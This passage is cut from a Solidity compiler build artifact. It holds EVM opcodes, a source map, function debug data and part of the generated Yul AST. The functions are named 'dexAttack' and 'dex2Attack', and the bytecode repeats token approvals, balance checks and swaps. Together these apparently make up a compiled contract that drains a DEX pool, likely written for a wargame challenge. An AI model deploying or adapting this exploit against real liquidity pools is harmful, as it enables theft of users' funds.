PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x966 SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x985 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x9A9 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x23B872DD PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x23B872DD SWAP1 PUSH2 0x9DF SWAP1 CALLER SWAP1 ADDRESS SWAP1 PUSH1 0xA SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x9FE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA22 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xA79 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xA9D SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x1 SLOAD PUSH1 0x3 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 NOT PUSH1 0x24 DUP3 ADD MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xAF4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB18 SWAP2 SWAP1 PUSH2 0xFBB JUMP JUMPDEST POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP4 PUSH4 0xDF791E50 SWAP4 DUP2 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xB74 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xB98 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBB6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xBD0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xBE4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xC44 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xC68 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC86 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xCA0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xCB4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xD14 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xD38 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD56 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD70 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xD84 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xDE4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xE08 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE26 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE40 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE54 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP SWAP2 DUP4 AND SWAP3 AND SWAP1 DUP3 SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEB4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xED8 SWAP2 SWAP1 PUSH2 0xFDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEF6 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF24 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x3 SLOAD PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0xDF791E5 PUSH1 0xE4 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND SWAP6 POP PUSH4 0xDF791E50 SWAP5 POP PUSH2 0x8FD SWAP4 SWAP3 DUP4 AND SWAP3 SWAP1 SWAP2 AND SWAP1 PUSH1 0x2D SWAP1 PUSH1 0x4 ADD PUSH2 0xF97 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0xF90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP3 AND PUSH1 0x20 DUP3 ADD MSTORE PUSH1 0x40 DUP2 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH1 0x60 ADD SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0xF90 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFEF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC0 ISZERO SLOAD POP MUL 0xB6 AND 0xC9 PUSH1 0x0 SUB BLOCKHASH CALLCODE GT 0xE4 0xB9 PUSH13 0x1EED86BE79A67AEF673E97BA5F 0x4B PUSH17 0x64736F6C63430008120033000000000000 ",
							"sourceMap": "254:2204:4:-:0;;;357:143;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;431:6;:16;;-1:-1:-1;;;;;431:16:4;;;-1:-1:-1;;;;;;431:16:4;;;;;;;;457;;;;;;;;;;;;;;;483:3;:10;;;;;;;;;;;254:2204;;14:177:5;93:13;;-1:-1:-1;;;;;135:31:5;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:378::-;284:6;292;300;353:2;341:9;332:7;328:23;324:32;321:52;;;369:1;366;359:12;321:52;392:40;422:9;392:40;:::i;:::-;382:50;;451:49;496:2;485:9;481:18;451:49;:::i;:::-;441:59;;519:49;564:2;553:9;549:18;519:49;:::i;:::-;509:59;;196:378;;;;;:::o;:::-;254:2204:4;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@dex2Attack_1113": {
									"entryPoint": 136,
									"id": 1113,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@dexAttack_913": {
									"entryPoint": 2353,
									"id": 913,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@setToken3_765": {
									"entryPoint": null,
									"id": 765,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 3943,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 4027,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_uint256_fromMemory": {
									"entryPoint": 4061,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_address_t_rational_10_by_1__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": 3991,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_address_t_rational_45_by_1__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_address_t_rational_90_by_1__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 4,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2807:5",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:5",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "84:216:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "130:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "139:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "142:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "132:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "132:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "132:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "105:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "114:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "101:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "101:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "126:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "97:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "97:32:5"
															},
															"nodeType": "YulIf",
															"src": "94:52:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "155:36:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "181:9:5"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "168:12:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "168:23:5"
															},
															"variables": [
																{
																	"name": "value",
																	"nodeType": "YulTypedName",
																	"src": "159:5:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "254:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "263:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "266:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "256:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "256:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "256:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "213:5:5"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "224:5:5"
																					},
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "239:3:5",
																										"type": "",
																										"value": "160"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "244:1:5",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "235:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "235:11:5"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "248:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "sub",
																							"nodeType": "YulIdentifier",
																							"src": "231:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "231:19:5"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "220:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "220:31:5"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "210:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "210:42:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "203:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "203:50:5"
															},
															"nodeType": "YulIf",
															"src": "200:70:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "279:15:5",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "289:5:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "279:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "50:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "61:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "73:6:5",
														"type": ""
													}
												],
												"src": "14:286:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "471:218:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "481:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "493:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "504:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "489:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "489:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "481:4:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "516:29:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "534:3:5",
																				"type": "",
																				"value": "160"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "539:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "530:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "530:11:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "543:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "526:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "526:19:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "520:2:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "561:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "576:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "584:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "572:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "572:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "554:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "554:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "554:34:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "608:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "619:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "604:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "604:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value1",
																				"nodeType": "YulIdentifier",
																				"src": "628:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "636:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "624:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "624:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "597:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "597:43:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "597:43:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "660:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "671:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "656:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "656:18:5"
																	},
																	{
																		"name": "value2",
																		"nodeType": "YulIdentifier",
																		"src": "676:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "649:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "649:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "649:34:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_rational_10_by_1__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "424:9:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "435:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "443:6:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "451:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "462:4:5",
														"type": ""
													}
												],
												"src": "305:384:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "772:199:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "818:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "827:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "830:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
